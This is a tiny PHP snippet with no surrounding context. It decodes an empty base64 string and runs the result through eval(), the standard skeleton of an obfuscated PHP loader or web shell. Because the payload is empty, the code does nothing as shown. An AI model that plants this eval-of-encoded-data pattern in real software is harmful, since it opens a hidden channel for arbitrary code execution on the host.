<?
$a=base64_decode('');
eval($a);

?>